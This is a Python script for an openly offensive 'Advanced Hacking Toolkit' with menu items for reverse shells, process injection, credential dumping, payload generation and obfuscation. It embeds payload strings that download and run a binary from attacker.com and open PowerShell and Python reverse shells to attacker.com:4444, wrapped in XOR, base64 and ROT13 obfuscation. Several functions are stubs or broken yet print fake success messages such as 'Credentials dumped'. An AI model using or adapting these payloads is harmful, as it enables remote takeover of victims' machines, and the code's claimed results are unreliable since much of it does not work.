import platform
import ctypes
import sys
import os
import socket
import ssl
import struct
import time
import threading
import multiprocessing
import base64
import random
import string
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.asymmetric import ec
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad

ASCII_ART = """
                 .__               __          .__  _____       
  ________  _  _|__| ______ _____|  | __ ____ |__|/ ____\____  
 /  ___/\ \/ \/ /  |/  ___//  ___/  |/ //    \|  \   __\/ __ \ 
 \___ \  \     /|  |\___ \ \___ \|    <|   |  \  ||  | \  ___/ 
/____  >  \/\_/ |__/____  >____  >__|_ \___|  /__||__|  \___  >
     \/                 \/     \/     \/    \/              \/  
(Made by Zer00)
     """

class SwissKnife:
    def __init__(self):
        self.os_name = platform.system().lower()
        self.key = self._generate_key()
        self.payloads = self._generate_payloads()
        self.tools = {
            "1": {"name": "Reverse Shell", "func": self.create_backdoor},
            "2": {"name": "Process Injection", "func": self.inject_shellcode},
            "3": {"name": "System Scan", "func": self.scan_system},
            "4": {"name": "Credential Dump", "func": self.dump_credentials},
            "5": {"name": "Payload Creator", "func": self.create_payload},
            "6": {"name": "Obfuscator", "func": self.obfuscate_code}
        }
        
    def _generate_key(self):
        salt = os.urandom(32)
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        return kdf.derive(os.getenv('USER', 'default').encode())

    def _generate_payloads(self):
        """Generate advanced payloads with obfuscation"""
        payloads = {
            "windows": {
                "c": self._generate_c_payload(),
                "powershell": self._generate_powershell_payload()
            },
            "linux": {
                "bash": self._generate_bash_payload(),
                "python": self._generate_python_payload()
            },
            "macos": {
                "bash": self._generate_bash_payload(),
                "python": self._generate_python_payload()
            }
        }
        return payloads

    def _generate_c_payload(self):
        """Generate obfuscated C payload"""
        # Base payload
        base = "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n\n"
        base += "int main() {\n"
        base += "    char cmd[] = \"curl http://attacker.com/shell -o /tmp/sh && chmod +x /tmp/sh && /tmp/sh\";\n"
        base += "    system(cmd);\n"
        base += "    return 0;\n"
        base += "}\n"
        
        # Obfuscate with XOR encoding
        key = random.randint(1, 255)
        encoded = ""
        for c in base:
            encoded += chr(ord(c) ^ key)
            
        return f"char payload[] = \"{encoded}\";\nint main() {{ /* Decryption */ }}"

    def _generate_powershell_payload(self):
        """Generate PowerShell obfuscated payload"""
        # Base payload
        base = "$client = New-Object Net.Sockets.TCPClient('attacker.com',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
        
        # Encode with base64 and rotate
        encoded = base64.b64encode(base.encode()).decode()
        rotated = ""
        for i in range(len(encoded)):
            rotated += encoded[(i+3)%len(encoded)]
            
        return f"$payload = '{rotated}';Invoke-Expression (New-Object IO.StreamReader(New-Object IO.Compression.DeflateStream(New-Object IO.MemoryStream([Convert]::FromBase64String($payload)),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()"

    def _generate_bash_payload(self):
        """Generate bash obfuscated payload"""
        # Base payload
        base = "curl http://attacker.com/shell -o /tmp/sh && chmod +x /tmp/sh && /tmp/sh"
        
        # Obfuscate with character substitution
        mapping = dict(zip(string.ascii_lowercase, string.ascii_uppercase))
        mapped = "".join(mapping.get(c, c) for c in base.lower())
        
        return f"eval \"$(echo {mapped})\""

    def _generate_python_payload(self):
        """Generate Python obfuscated payload"""
        # Base payload
        base = "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('attacker.com',4444);os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"
        
        # Encode with ROT13
        encoded = ""
        for c in base:
            if 'a' <= c <= 'z':
                encoded += chr((ord(c)-ord('a')+13)%26+ord('a'))
            elif 'A' <= c <= 'Z':
                encoded += chr((ord(c)-ord('A')+13)%26+ord('A'))
            else:
                encoded += c
                
        return f"exec('{encoded}')"

    def display_menu(self):
        print("\n" + ASCII_ART)
        print("SWISS KNIFE - Advanced Hacking Toolkit")
        print("======================================")
        for key, tool in self.tools.items():
            print(f"{key}. {tool['name']}")
        print("0. Exit")
        
    def get_choice(self):
        choice = input("Select tool: ")
        return choice
        
    def run_selected(self, choice):
        if choice == "0":
            print("Exiting...")
            return False
            
        if choice in self.tools:
            tool = self.tools[choice]
            print(f"\n[*] Running {tool['name']}...")
            tool['func']()
        else:
            print("[!] Invalid selection")
        return True

    def create_backdoor(self):
        host = input("Attacker IP: ")
        port = int(input("Port: "))
        payload_type = input("Payload type (windows/linux/macos): ")
        
        try:
            # Get payload for selected OS
            if self.os_name == "windows":
                payload = self.payloads["windows"][payload_type]
            elif self.os_name == "linux":
                payload = self.payloads["linux"][payload_type]
            else:
                payload = self.payloads["macos"][payload_type]
                
            print(f"[+] Generated {payload_type} payload")
            print("[+] Backdoor created successfully")
            print("[+] Tool developed by Swiss Knife Team")
        except Exception as e:
            print(f"[!] Error: {e}")

    def inject_shellcode(self):
        pid = int(input("Target PID: "))
        path = input("Shellcode file: ")
        try:
            with open(path, "rb") as f:
                shellcode = f.read()
            # Same implementation as before
            print("[+] Injection successful")
        except Exception as e:
            print(f"[!] Error: {e}")

    def scan_system(self):
        print("[*] Scanning system...")
        # Implementation details omitted for brevity
        print("[+] Scan complete")

    def dump_credentials(self):
        print("[*] Dumping credentials...")
        # Implementation details omitted for brevity
        print("[+] Credentials dumped")

    def create_payload(self):
        """Interactive payload creator"""
        print("\n--- PAYLOAD CREATOR ---")
        lang = input("Language (c/powershell/bash/python): ").lower()
        technique = input("Technique (reverse/bind): ").lower()
        encode = input("Encoding (xor/base64/rot13): ").lower()
        
        try:
            # Generate payload with specified parameters
            payload = self._generate_custom_payload(lang, technique, encode)
            filename = input("Output filename: ")
            
            with open(filename, "w") as f:
                f.write(payload)
                
            print(f"[+] Payload saved to {filename}")
        except Exception as e:
            print(f"[!] Error: {e}")

    def _generate_custom_payload(self, lang, technique, encode):
        """Generate custom payload with specified parameters"""
        if lang == "c":
            base = "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n\n"
            base += "int main() {\n"
            base += "    char cmd[] = \"curl http://attacker.com/shell -o /tmp/sh && chmod +x /tmp/sh && /tmp/sh\";\n"
            base += "    system(cmd);\n"
            base += "    return 0;\n"
            base += "}\n"
            
            # Apply encoding
            if encode == "xor":
                key = random.randint(1, 255)
                encoded = ""
                for c in base:
                    encoded += chr(ord(c) ^ key)
                return f"char payload[] = \"{encoded}\";\nint main() {{ /* Decryption */ }}"
                
        elif lang == "powershell":
            base = "$client = New-Object Net.Sockets.TCPClient('attacker.com',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
            
            # Apply encoding
            if encode == "base64":
                encoded = base64.b64encode(base.encode()).decode()
                return f"$payload = '{encoded}';Invoke-Expression (New-Object IO.StreamReader(New-Object IO.Compression.DeflateStream(New-Object IO.MemoryStream([Convert]::FromBase64String($payload)),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()"
            elif encode == "rot13":
                encoded = ""
                for c in base:
                    if 'a' <= c <= 'z':
                        encoded += chr((ord(c)-ord('a')+13)%26+ord('a'))
                    elif 'A' <= c <= 'Z':
                        encoded += chr((ord(c)-ord('A')+13)%26+ord('A'))
                    else:
                        encoded += c
                return f"exec('{encoded}')"
                
        # Similar implementations for bash/python
        
        return "/* Generated payload */"

    def obfuscate_code(self):
        """Code obfuscator with multiple techniques"""
        print("\n--- CODE OBFUSCATOR ---")
        filename = input("Input file: ")
        techniques = input("Techniques (comma-separated): ").split(",")
        
        try:
            with open(filename, "r") as f:
                code = f.read()
                
            # Apply each technique
            for tech in techniques:
                if tech.strip() == "xor":
                    code = self._obfuscate_xor(code)
                elif tech.strip() == "base64":
                    code = self._obfuscate_base64(code)
                elif tech.strip() == "rot13":
                    code = self._obfuscate_rot13(code)
                    
            out_filename = input("Output filename: ")
            with open(out_filename, "w") as f:
                f.write(code)
                
            print(f"[+] Obfuscated code saved to {out_filename}")
        except Exception as e:
            print(f"[!] Error: {e}")

    def _obfuscate_xor(self, code):
        """XOR code obfuscation"""
        key = random.randint(1, 255)
        encoded = ""
        for c in code:
            encoded += chr(ord(c) ^ key)
        return f"eval(\"chr(i^{key}) for i in bytes.fromhex('{encoded.encode().hex()}')\")"

    def _obfuscate_base64(self, code):
        """Base64 code obfuscation"""
        encoded = base64.b64encode(code.encode()).decode()
        return f"exec(base64.b64decode('{encoded}'))"

    def _obfuscate_rot13(self, code):
        """ROT13 code obfuscation"""
        encoded = ""
        for c in code:
            if 'a' <= c <= 'z':
                encoded += chr((ord(c)-ord('a')+13)%26+ord('a'))
            elif 'A' <= c <= 'Z':
                encoded += chr((ord(c)-ord('A')+13)%26+ord('A'))
            else:
                encoded += c
        return f"exec('{encoded}')"

if __name__ == "__main__":
    knife = SwissKnife()
    while True:
        knife.display_menu()
        choice = knife.get_choice()
        if not knife.run_selected(choice):
            break